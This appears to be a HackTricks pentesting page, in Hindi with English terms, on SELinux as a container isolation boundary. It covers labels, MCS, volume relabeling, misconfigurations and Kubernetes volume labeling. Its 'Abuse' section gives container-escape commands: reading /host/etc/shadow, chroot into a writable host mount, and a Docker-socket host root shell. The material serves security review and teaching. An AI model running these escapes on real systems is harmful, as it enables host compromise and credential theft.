# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

SELinux एक **label-based Mandatory Access Control** system है। हर relevant process और object के पास एक security context हो सकता है, और policy तय करती है कि कौन-से domains किन types के साथ और किस तरीके से interact कर सकते हैं। Containerized environments में आमतौर पर इसका अर्थ है कि runtime container process को एक confined container domain के अंतर्गत launch करता है और container content को corresponding types के साथ label करता है। यदि policy सही तरीके से काम कर रही हो, तो process उन चीजों को read और write कर सकता है, जिन्हें उसका label access करने की अनुमति देता है, जबकि अन्य host content तक access से इनकार किया जाता है, भले ही वह content किसी mount के माध्यम से visible हो जाए।

यह mainstream Linux container deployments में उपलब्ध सबसे शक्तिशाली host-side protections में से एक है। यह Fedora, RHEL, CentOS Stream, OpenShift और अन्य SELinux-centric ecosystems पर विशेष रूप से महत्वपूर्ण है। इन environments में, जो reviewer SELinux को नजरअंदाज करता है, वह अक्सर यह गलत समझेगा कि host compromise का स्पष्ट दिखने वाला path वास्तव में blocked क्यों है।

## AppArmor बनाम SELinux

High-level स्तर पर सबसे आसान अंतर यह है कि AppArmor path-based है, जबकि SELinux **label-based** है। इसका container security पर बड़ा प्रभाव पड़ता है। यदि वही host content किसी unexpected mount path के अंतर्गत visible हो जाए, तो path-based policy का व्यवहार अलग हो सकता है। इसके विपरीत, label-based policy यह देखती है कि object का label क्या है और process domain उसके साथ क्या कर सकता है। इससे SELinux सरल नहीं हो जाता, लेकिन यह path-trick assumptions की उस category के विरुद्ध robust बनता है, जिन्हें defenders कभी-कभी AppArmor-based systems में अनजाने में बना लेते हैं।

क्योंकि model label-oriented है, इसलिए container volume handling और relabeling decisions security-critical होते हैं। यदि runtime या operator "make mounts work" के लिए labels को बहुत व्यापक रूप से बदल देता है, तो workload को contain करने वाली policy boundary intended से कहीं अधिक कमजोर हो सकती है।

## Lab

यह देखने के लिए कि host पर SELinux active है या नहीं:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
host पर मौजूद labels का निरीक्षण करने के लिए:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
सामान्य run की तुलना labeling अक्षम किए गए run से करने के लिए:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
SELinux-सक्षम host पर, यह एक बहुत व्यावहारिक प्रदर्शन है क्योंकि यह अपेक्षित container domain के अंतर्गत चल रहे workload और उस enforcement layer से वंचित workload के बीच का अंतर दिखाता है।

## Runtime Usage

Podman उन systems पर SELinux के साथ विशेष रूप से अच्छी तरह aligned है जहाँ SELinux platform default का हिस्सा है। Rootless Podman और SELinux का संयोजन mainstream container baselines में सबसे मजबूत विकल्पों में से एक है, क्योंकि process host side पर पहले से unprivileged होता है और फिर भी MAC policy द्वारा confined रहता है। जहाँ supported हो, वहाँ Docker भी SELinux का उपयोग कर सकता है, हालांकि administrators कभी-कभी volume-labeling से जुड़ी समस्याओं से बचने के लिए इसे disable कर देते हैं। CRI-O और OpenShift अपनी container isolation story के हिस्से के रूप में SELinux पर काफी निर्भर करते हैं। Kubernetes SELinux-संबंधित settings भी expose कर सकता है, लेकिन उनका मूल्य स्पष्ट रूप से इस बात पर निर्भर करता है कि node OS वास्तव में SELinux को support और enforce करता है या नहीं।<sup>[[2]](#references)</sup>

बार-बार सामने आने वाली सीख यह है कि SELinux कोई optional garnish नहीं है। जिन ecosystems को इसके आसपास बनाया गया है, उनमें यह expected security boundary का हिस्सा है। Host-side policy enumeration, transition analysis और SELinux administration tools के abuse के लिए [general SELinux page](../../../interesting-files-permissions/selinux.md) देखें।

## MCS Categories and Volume Relabeling

Container isolation सामान्यतः **type enforcement** और **Multi-Category Security (MCS)** का संयोजन होता है। दो processes दोनों `container_t` के रूप में चल सकते हैं, लेकिन उन्हें `s0:c123,c456` और `s0:c321,c654` जैसे अलग-अलग levels प्राप्त होते हैं। Private container content को matching categories के साथ `container_file_t` label किया जाता है, इसलिए केवल किसी दूसरे container के path तक पहुँचना उस तक access करने के लिए पर्याप्त नहीं है। Runtimes सामान्यतः category pair allocate करते हैं; किसी level का जानबूझकर manual reuse करने से यह per-container separation समाप्त हो जाता है।<sup>[[3]](#references)</sup>

केवल type check करने के बजाय process और mount labels की तुलना करें:<sup>[[3]](#references)</sup>
```bash
podman inspect --format 'process={{.ProcessLabel}} mount={{.MountLabel}}' <container>
podman top <container> label
ps -eZ | grep -E 'container_t|spc_t'
ls -Zd /path/to/bind-mount
```
Bind-mount suffixes host inode labels को बदलते हैं और इसलिए केवल mount metadata ही नहीं, बल्कि security boundary भी बदलते हैं:<sup>[[3]](#references)</sup>

- `:Z` container की MCS categories के साथ एक private label लागू करता है। यह उस volume के लिए उपयुक्त है जिसका स्वामित्व एक container या Pod के पास हो।
- `:z` एक shared label लागू करता है, ताकि अन्य confined containers भी content का उपयोग कर सकें (DAC permissions के अधीन)। इसे secrets या tenant-specific data के लिए उपयोग करने से MCS isolation हट जाता है, जो अन्यथा containers को अलग रखता।
- Relabeling recursive होता है। `/`, `/etc`, `/usr` या पूरे home tree जैसे व्यापक host trees पर किसी भी विकल्प को लागू करने से selected container के सामने content उजागर हो सकता है और host services भी रुक सकती हैं, क्योंकि उनके अपेक्षित labels बदल दिए गए हैं।

Manual level reuse को command lines और manifests में आसानी से पहचाना जा सकता है। निम्नलिखित दो containers को जानबूझकर समान MCS level मिलता है और इसलिए वे उस level के लिए labeled content का उपयोग कर सकते हैं:<sup>[[3]](#references)</sup>
```bash
podman run --security-opt label=level:s0:c100,c200 ...
podman run --security-opt label=level:s0:c100,c200 ...
```
साथ ही, `label=nested` और `label=disable` में अंतर करना आवश्यक है: पहला container के अंदर SELinux operations को expose करता है और label changes की अनुमति केवल वहीं देता है जहाँ policy अनुमति देती है, जबकि दूसरा उस workload के लिए label separation को हटा देता है। दोनों की समीक्षा आवश्यक है, लेकिन वे equivalent नहीं हैं।<sup>[[3]](#references)</sup>

## Misconfigurations

सबसे सामान्य गलती `label=disable` है। Operationally, ऐसा अक्सर इसलिए होता है क्योंकि volume mount को deny कर दिया गया था और labeling model को ठीक करने के बजाय SELinux को समीकरण से हटाना सबसे तेज़ short-term समाधान लगा।<sup>[[1]](#references)</sup> एक अन्य सामान्य गलती host content का गलत relabeling है। व्यापक relabel operations application को काम करने योग्य बना सकते हैं, लेकिन वे container को मूल रूप से अपेक्षित सीमा से कहीं अधिक content को touch करने की अनुमति भी दे सकते हैं।

**installed** SELinux और **effective** SELinux को आपस में confuse न करना भी महत्वपूर्ण है। कोई host SELinux को support कर सकता है और फिर भी permissive mode में हो सकता है, या runtime workload को अपेक्षित domain के अंतर्गत launch न कर रहा हो सकता है। इन स्थितियों में protection documentation के संकेत से कहीं कमजोर होती है।

## Abuse

जब SELinux workload के लिए अनुपस्थित, permissive या व्यापक रूप से disabled होता है, तो host-mounted paths का abuse करना बहुत आसान हो जाता है। वही bind mount, जिसे अन्यथा labels द्वारा सीमित किया जाता, host data तक पहुँचने या host modification का direct avenue बन सकता है। यह विशेष रूप से writable volume mounts, container runtime directories या उन operational shortcuts के साथ महत्वपूर्ण है, जिनसे सुविधा के लिए sensitive host paths expose किए गए हों।

SELinux अक्सर यह समझाता है कि generic breakout writeup एक host पर तुरंत काम करता है, लेकिन दूसरे host पर बार-बार fail होता है, भले ही runtime flags समान दिखें। Missing ingredient अक्सर कोई namespace या capability नहीं, बल्कि एक label boundary होती है जो intact रही।

सबसे तेज़ practical check active context की तुलना करना और फिर उन mounted host paths या runtime directories की जाँच करना है, जिन्हें सामान्यतः labels द्वारा confined किया जाता है:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
यदि host bind mount मौजूद है और SELinux labeling को disabled या कमजोर किया गया है, तो अक्सर information disclosure सबसे पहले होता है:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
यदि mount writable है और kernel के दृष्टिकोण से container प्रभावी रूप से host-root है, तो अगला कदम अनुमान लगाने के बजाय नियंत्रित host modification का परीक्षण करना है:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
SELinux-सक्षम hosts पर, runtime state directories के आसपास labels खोने से direct privilege-escalation paths भी उजागर हो सकते हैं:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
ये commands full escape chain का स्थान नहीं लेते, लेकिन ये बहुत जल्दी स्पष्ट कर देते हैं कि host data access या host-side file modification को रोकने वाला SELinux ही था या नहीं।

### पूर्ण उदाहरण: SELinux Disabled + Writable Host Mount

यदि SELinux labeling disabled है और host filesystem को `/host` पर writable रूप से mount किया गया है, तो full host escape एक सामान्य bind-mount abuse case बन जाता है:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
यदि `chroot` सफल होता है, तो container process अब host filesystem से operating कर रहा है:
```bash
id
hostname
cat /etc/passwd | tail
```
### पूर्ण उदाहरण: SELinux Disabled + Runtime Directory

यदि labels disabled होने के बाद workload किसी runtime socket तक पहुँच सकता है, तो escape को runtime को delegate किया जा सकता है:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
प्रासंगिक अवलोकन यह है कि SELinux अक्सर वह नियंत्रण था जो ठीक इस प्रकार के host-path या runtime-state access को रोकता था।

## जाँच

SELinux checks का लक्ष्य यह पुष्टि करना है कि SELinux enabled है, वर्तमान security context की पहचान करना है, और यह देखना है कि जिन files या paths की आपको परवाह है, वे वास्तव में label-confined हैं या नहीं।
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
यहाँ क्या महत्वपूर्ण है:

- `getenforce` को आदर्श रूप से `Enforcing` लौटाना चाहिए; `Permissive` या `Disabled` पूरे SELinux section का अर्थ बदल देता है।
- यदि current process context अनपेक्षित या बहुत व्यापक दिखाई देता है, तो workload intended container policy के अंतर्गत नहीं चल रहा हो सकता है।
- यदि host-mounted files या runtime directories पर ऐसे labels हैं जिन्हें process बहुत स्वतंत्र रूप से access कर सकता है, तो bind mounts कहीं अधिक खतरनाक हो जाते हैं।

SELinux-capable platform पर किसी container की समीक्षा करते समय labeling को secondary detail न मानें। कई मामलों में यही उन मुख्य कारणों में से एक होता है कि host अभी तक compromised नहीं हुआ है।

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Host-dependent | SELinux separation SELinux-enabled hosts पर उपलब्ध है, लेकिन exact behavior host/daemon configuration पर निर्भर करता है | `--security-opt label=disable`, bind mounts का broad relabeling, `--privileged` |
| Podman | SELinux hosts पर सामान्यतः enabled | SELinux systems पर Podman का सामान्य हिस्सा SELinux separation है, जब तक इसे disabled न किया जाए | `--security-opt label=disable`, `containers.conf` में `label=false`, `--privileged` |
| Kubernetes | SELinux nodes पर runtime-assigned; explicitly configurable | जब Pod कोई label set नहीं करता, तो runtime unique label allocate कर सकता है। Explicit `securityContext.seLinuxOptions` Pod/volume label को control करता है; Kubernetes 1.37 पर eligible volumes default रूप से SELinux mount labeling का उपयोग करते हैं | duplicated MCS levels, permissive/disabled nodes, broad privileged workloads, indiscriminate `seLinuxChangePolicy: Recursive` <sup>[[2]](#references)[[4]](#references)</sup> |
| CRI-O / OpenShift style deployments | Commonly relied on heavily | इन environments में SELinux अक्सर node isolation model का core हिस्सा होता है | ऐसे custom policies जो access को आवश्यकता से अधिक broad कर दें, compatibility के लिए labeling disabled करना |

SELinux defaults seccomp defaults की तुलना में अधिक distribution-dependent होते हैं। Fedora/RHEL/OpenShift-style systems पर SELinux अक्सर isolation model का central हिस्सा होता है। Non-SELinux systems पर यह simply absent होता है।

## Kubernetes 1.37 Volume Labeling

Kubernetes 1.37 ने `SELinuxMount` को stable बनाया और इसे default रूप से enabled किया। Eligible PVC, `seLinuxOptions` वाले Pod और `.spec.seLinuxMount: true` advertise करने वाले CSI driver के लिए kubelet हर inode को recursively relabel करने के लिए runtime से कहने के बजाय `-o context=<label>` का उपयोग करता है। Unsupported drivers और volume types अभी भी recursive path का उपयोग करते हैं। इससे बड़े relabel walk से बचा जाता है और केवल Pod को volume expose करने के लिए हर file के persistent labels बदलने से भी बचा जाता है।<sup>[[2]](#references)[[4]](#references)</sup>

एक mount में केवल एक ऐसा context हो सकता है। इसलिए, **different SELinux labels** वाले Pods जो same eligible volume को same node पर उपयोग करते हैं, अब default `MountOption` behavior के अंतर्गत coexist नहीं कर सकते: एक Pod `conflicting SELinux labels of volume` error के साथ `ContainerCreating` में रहता है। इसे availability issue और इस उपयोगी संकेत—दोनों के रूप में देखें कि workloads MCS boundaries के पार storage implicitly share कर रहे थे। यदि ऐसा sharing intentional है—उदाहरण के लिए, same volume का उपयोग करने वाला एक privileged `spc_t` Pod और एक confined Pod—तो per-Pod compatibility escape hatch `seLinuxChangePolicy: Recursive` है; runtime किन paths को relabel करेगा, यह समझे बिना इसे पूरे cluster पर लागू न करें।<sup>[[2]](#references)[[4]](#references)</sup>
```yaml
spec:
securityContext:
seLinuxOptions:
level: "s0:c123,c456"
seLinuxChangePolicy: Recursive
```
उपयोगी cluster-side checks:<sup>[[2]](#references)</sup>
```bash
# Drivers that opt in to -o context= volume mounts
kubectl get csidriver -o custom-columns=NAME:.metadata.name,SELINUX_MOUNT:.spec.seLinuxMount

# Explicit levels or recursive-policy exceptions
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.securityContext.seLinuxOptions or
.spec.securityContext.seLinuxChangePolicy) |
[.metadata.namespace,.metadata.name,
(.spec.securityContext.seLinuxOptions.level // "-"),
(.spec.securityContext.seLinuxChangePolicy // "MountOption")] | @tsv'

# Start failures and warnings caused by incompatible labels
kubectl get events -A --sort-by=.lastTimestamp |
grep -Ei 'SELinux|conflicting SELinux labels'
```
वैकल्पिक kube-controller-manager का `selinux-warning-controller` उन Pods का पता लगाता है जो असंगत labels वाले volume को share करते हैं और `selinux_warning_controller_selinux_volume_conflict` metric को expose करता है। Upgrades से पहले या volume-label behavior बदलने से पहले इसे enable और review करें; यह genuine policy conflict को सामान्य CSI या filesystem failure से अलग पहचानने में मदद करता है।<sup>[[2]](#references)</sup>

## References

- [1] [Podman Documentation: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: किसी Pod या Container के लिए Security Context कॉन्फ़िगर करें](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [3] [Podman run documentation: SELinux labels और volume relabeling](https://docs.podman.io/en/latest/markdown/podman-run.1.html)
- [4] [Kubernetes v1.37 release: SELinuxMount और SELinuxChangePolicy](https://kubernetes.io/blog/2026/08/26/kubernetes-v1-37-release/)
{{#include ../../../../banners/hacktricks-training.md}}
